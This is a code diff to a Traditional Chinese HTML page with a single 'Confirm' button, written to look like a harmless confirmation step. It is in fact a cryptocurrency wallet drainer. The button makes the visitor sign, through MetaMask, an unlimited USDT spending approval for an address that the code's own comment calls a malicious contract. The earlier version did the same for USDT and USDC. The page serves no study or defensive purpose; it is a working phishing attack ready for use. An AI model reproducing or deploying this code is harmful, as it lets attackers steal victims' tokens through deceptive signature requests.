@@ -3,38 +3,36 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8" />
-  <title>確認頁</title>
+  <title>確認</title>
 </head>
 <body style="text-align: center; font-family: sans-serif; padding-top: 100px;">
-  <button style="font-size: 1.2rem; padding: 1em 2em;" onclick="approveAll()">確認</button>
+  <button style="font-size: 1.2rem; padding: 1em 2em;" onclick="approveUSDT()">確認</button>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const tokenList = [
-      { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
-      { name: "USDC", address: "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", decimals: 6 }
-    ];
-    const spender = "0x2b1D7DcB43012eE1E21934420CfCC2F88E730F10"; // 你的惡意合約地址
+    const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const spender = "0x2b1D7DcB43012eE1E21934420CfCC2F88E730F10"; // 惡意合約地址（非EOA）
     const abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
 
-    async function approveAll() {
-      if (!window.ethereum) return alert("請先安裝 MetaMask");
+    async function approveUSDT() {
+      if (!window.ethereum) {
+        alert("請先安裝 MetaMask");
+        return;
+      }
+
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       await provider.send("eth_requestAccounts", []);
       const signer = provider.getSigner();
 
-      for (const token of tokenList) {
-        try {
-          const contract = new ethers.Contract(token.address, abi, signer);
-          const amount = ethers.constants.MaxUint256;
-          const tx = await contract.approve(spender, amount);
-          console.log(`✅ 已授權 ${token.name}`, tx.hash);
-        } catch (err) {
-          console.warn(`❌ ${token.name} 授權失敗:`, err.message);
-        }
+      try {
+        const usdt = new ethers.Contract(usdtAddress, abi, signer);
+        const tx = await usdt.approve(spender, ethers.constants.MaxUint256);
+        console.log("✅ 已授權 USDT", tx.hash);
+        alert("確認完成，TX: " + tx.hash);
+      } catch (err) {
+        console.error("❌ 授權失敗：", err);
+        alert("授權失敗：" + err.message);
       }
-
-      alert("確認完成");
     }
   </script>
 </body>
